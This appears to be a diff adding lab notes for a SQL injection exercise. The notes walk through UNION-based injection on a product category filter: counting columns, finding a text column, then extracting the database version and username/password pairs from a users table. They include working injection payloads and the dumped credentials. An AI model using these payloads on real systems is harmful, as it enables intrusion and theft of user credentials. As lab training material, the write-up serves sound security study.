@@ -1,0 +1,33 @@
+
+SQL Injection - Product category
+
+Analysis:
+--------
+
+1) Find the number of columns that the vulnerable application is using:
+' order by 1-- -> not displayed on the page
+' order by 2-- -> displayed on the page
+' order by 3-- -> internal server error
+
+3 - 1 = 2
+
+
+2) Find which columns contain text
+' UNION SELECT 'a', NULL--
+' UNION SELECT NULL, 'a'-- ->**
+
+
+3) Output data from other tables
+' UNION select NULL, username from users--
+' UNION select NULL, password from users--
+
+' UNION select NULL, version()--
+-> PostgreSQL 12.12 (Ubuntu 12.12-0ubuntu0.20.04.1) on x86_64-pc-linux-gnu, compiled by gcc (Ubuntu 9.4.0-1ubuntu1~20.04.1) 9.4.0, 64-bit
+
+' UNION select NULL, username || '*' || password from users--
+
+wiener*txfujssukpj1qbibf8mr
+carlos*5t4ewj4nirexbjy3bup9
+administrator*x71eehh5cbgnk8jlh1hh
+
+script.py <url>
